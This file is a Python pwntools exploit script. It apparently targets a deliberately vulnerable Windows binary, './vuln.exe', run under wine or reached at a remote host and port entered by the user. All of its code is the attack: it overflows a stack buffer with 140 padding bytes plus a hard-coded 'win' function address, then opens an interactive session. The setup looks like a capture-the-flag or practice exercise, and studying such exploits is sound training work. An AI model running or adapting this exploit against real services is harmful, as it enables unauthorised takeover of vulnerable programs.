from pwn import *
import sys

binary = "./vuln.exe"

# Target architecture: set to i386 for PE32 or amd64 for PE32+ (x64)
context.arch = "i386"
context.log_level = "info"


win_address = 0x401530




def start(argv=[], *a, **kw):
    if args.REMOTE:
        host = input("HOST: ")
        port = int(input("PORT: "))
        return remote(host, port)

    if args.GDB:
        # start the binary under wine and have gdb attach
        # gdb.debug will spawn `wine ./vuln.exe` then attach gdb to it
        return gdb.debug(["wine", binary], gdbscript=gdbscript())

    # normal local run under wine
    return process(["wine", binary], *a, **kw)


def gdbscript():
    # sample gdbscript: set break at address or set a breakpoint on WinMain
    return """
set follow-fork-mode parent
# example breakpoint at known address
break *0x401020
continue
"""



p = start()
# build payload for 32-bit process
payload = b"A" * 140
payload += p32(win_address)
p.sendline(payload)
p.interactive()
